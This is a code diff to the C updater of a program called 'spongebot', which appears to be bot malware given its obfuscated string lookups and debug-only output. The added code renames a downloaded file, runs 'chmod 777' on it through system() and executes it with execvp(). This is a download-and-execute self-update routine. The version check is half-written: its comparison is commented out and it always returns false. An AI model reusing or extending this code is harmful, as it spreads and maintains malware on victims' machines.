@@ -55,10 +55,27 @@ static bool is_update_avaible()
     curl_easy_cleanup(curl);
     curl_global_cleanup();
 
-    // Logic to compare the local version with the downloaded version would go here
-    // Example: Compare local version and remote version file, return true if an update is needed.
+    char local_version[50], remote_version[50];
+    FILE *local_fp = fopen(dict_get(UPDATER_VER_FILE), "r");
+    FILE *remote_fp = fopen(version_file, "r");
 
-    return true;
+    if (!local_fp || !remote_fp)
+    {
+#ifdef DEBUG
+        printf("Failed to open version files for comparison\n");
+#endif
+        return false;
+    }
+
+    // fgets(local_version, sizeof(local_version), local_fp);
+    // fgets(remote_version, sizeof(remote_version), remote_fp);
+    //
+    // fclose(local_fp);
+    // fclose(remote_fp);
+
+    // return strcmp(local_version, remote_version) != 0;
+
+    return false; // TODO now returns always false
 }
 
 void updater_init()
@@ -97,9 +114,21 @@ void updater_init()
                     printf("[updater] Download completed.\n");
 #endif
 
-                    rename(dict_get(UPDATER_TMP_FILE), "spongebot");
-                    system("chmod +x ./spongebot");
-                    char *args[] = {"./spongebot", NULL};
+                    //TODO add strings to dict
+                    char *new_name, *_command, *args[3];
+
+                    do
+                    {
+                        new_name = "spongebot";
+                        _command = "chmod 777 spongebot";
+
+                        args[0] = "./spongebot";
+                        args[1] = NULL;
+                    } while (0);
+
+                    rename(dict_get(UPDATER_TMP_FILE), new_name);
+                    system(_command);
+                    // char *args[] = {"./spongebot", NULL};
                     execvp(args[0], args);
 
 #ifdef DEBUG
